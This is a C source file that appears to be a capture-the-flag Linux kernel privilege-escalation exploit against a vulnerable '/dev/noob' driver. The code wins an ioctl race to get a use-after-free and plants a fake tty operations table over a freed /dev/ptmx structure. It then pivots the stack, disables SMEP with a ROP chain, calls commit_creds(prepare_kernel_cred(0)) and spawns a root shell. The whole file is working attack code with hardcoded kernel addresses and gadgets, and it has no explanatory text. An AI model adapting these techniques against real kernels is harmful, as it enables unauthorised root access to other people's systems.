
#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
struct trap_frame{
    void *rip;
    uint64_t cs;
    uint64_t rflags;
    void * rsp;
    uint64_t ss;
}__attribute__((packed));
struct trap_frame tf;
int fd=-1;
uint64_t (*commit_creds)(uint64_t cred) = 0xffffffff810b99d0;
uint64_t (*prepare_kernel_cred)(uint64_t cred) = 0xffffffff810b9d80;
void launch_shell();
void save_status();
void save_status(){
     asm(
       " mov %%cs, %0\n"
       "mov %%ss,%1\n"
       "mov %%rsp,%3\n"
       "pushfq\n"
       "popq %2"
       :"=r"(tf.cs),"=r"(tf.ss),"=r"(tf.rflags),"=r"(tf.rsp)
       :
       :"memory"
    );
    tf.rsp -= 4096;
    tf.rip = &launch_shell;
}
void launch_shell(){
    execl("/bin/sh","sh",NULL);
}
void payload(){
    commit_creds(prepare_kernel_cred(0));
    asm("movq $tf, %rsp\n"
        "swapgs\n"
        "iretq\n");
    launch_shell();
}

uint64_t u64(char * s){
    uint64_t result = 0;
    for (int i = 7 ; i >=0 ;i--){
        result = (result << 8) | (0x00000000000000ff&s[i]);
    }
    return result;
}

typedef struct para{
    size_t index;
    void *ptr;
    size_t size;
};
struct para Para;
int add(size_t idx,size_t sz){
    Para.index=idx;
    Para.size=sz;
    return ioctl(fd,0x30000,&Para);
}
void delete(size_t idx){
    Para.index=idx;
    ioctl(fd,0x30001,&Para);
}
void edit(size_t idx,char* buf,size_t sz){
    Para.index=idx;
    Para.ptr=buf;
    Para.size=sz;
    ioctl(fd,0x30002,&Para);
}
void show(size_t idx,char* buf,size_t sz){
    Para.index=idx;
    Para.ptr=buf;
    Para.size=sz;
    ioctl(fd,0x30003,&Para);
}

void race(){
    while(1){
        Para.size=0x2e0;
    }
}

int main(int argc, char *argv[]){
    fd = open("/dev/noob",0);
    if(fd<0){
        perror("open");
        exit(-1);
    }
    save_status();
    char temp[0x100];
    char buf[0x60]={0};
    pthread_t t; 
    pthread_create(&t, NULL, race, NULL);
    int i=0;
    while(1){
        if(!add(0,0)){
            break;
        }
        i++;
    }
    printf("\n%d\n");
    puts("race success");
    pthread_cancel(t);
    delete(0);
    size_t xchgeaxesp = 0xffffffff8101db17;//0xffffffff81007808; 
    size_t fake_stack = xchgeaxesp & 0xffffffff; 
    commit_creds = 0xffffffff810ad430; 
    prepare_kernel_cred = 0xffffffff810ad7e0; 
    size_t *map = mmap((void *)(fake_stack&0xfffff000), 0x1000, 7, 0x22, -1, 0);
    if(!map){
        perror("mmap");
        exit(-1);
    }
    size_t rop[] = { 0xffffffff813f6c9d, // pop rdi; ret; 
    0x6f0, // cr4 with smep disabled 
    0xffffffff81069b10, // mov cr4, rdi; ret; 
    (size_t)payload 
    };
    memcpy(fake_stack,rop,sizeof(rop));
    
    size_t fake_tty_op[30]={0};
    fake_tty_op[12]=xchgeaxesp;//ioctl->xchgeeaxesp
    int fd_tty = open("/dev/ptmx",O_RDWR|O_NOCTTY);
    show(0,&buf,0x20);
    *(size_t*)&buf[0x18]=fake_tty_op;
    edit(0,buf,0x20);
    ioctl(fd_tty,0,0);
    close(fd);
    
    return 0;
}
